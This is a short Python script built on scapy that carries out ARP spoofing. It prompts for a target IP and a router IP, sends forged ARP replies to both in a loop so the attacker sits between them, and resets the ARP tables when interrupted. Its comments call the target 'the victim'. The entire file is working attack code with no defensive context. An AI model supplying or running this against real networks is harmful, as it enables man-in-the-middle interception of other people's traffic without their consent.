#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
from pip._vendor.distlib.compat import raw_input

#targets the victims ip and the router's ip including the mac address
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#Self explanatory
def get_mac(ip):
    answered_client = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip))[0]
    return answered_client[0][1].hwsrc

#restores the connection in the expcept part of the code
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,  psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

packet_count = 0
target_ip = raw_input("Target IP ")
sppof_ip = raw_input("Router IP ")

#This makes sure that captures an error or if the user presses ctrl+C
try:
    while True:
        spoof(target_ip, sppof_ip)
        spoof(sppof_ip, target_ip)
        packet_count = packet_count + 2
        print("\r[+} Packets sent: " + str(packet_count), end="")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Deleting CTRL + C ............ Resetting ARP Tables.\n")
    restore(sppof_ip, target_ip)
    restore(target_ip, sppof_ip)